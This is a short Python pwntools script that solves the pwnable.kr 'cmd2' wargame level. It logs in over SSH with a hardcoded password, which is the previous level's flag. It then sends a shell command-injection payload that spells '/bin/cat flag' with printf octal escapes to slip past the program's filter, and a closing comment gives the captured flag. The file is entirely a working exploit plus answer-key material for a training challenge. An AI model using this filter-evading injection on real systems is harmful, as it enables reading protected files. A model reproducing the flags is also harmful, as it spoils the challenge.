from pwn import *

con = ssh("cmd2", "pwnable.kr", 2222, "mommy now I get what PATH environment is for :)")
# ASCII encode
payload = '\'$(printf "\\057bin\\057cat "fl""ag"")\''
sh = con.run("/home/cmd2/cmd2 " + payload)
print(sh.recvlines(2)[1])

# FuN_w1th_5h3ll_v4riabl3s_haha
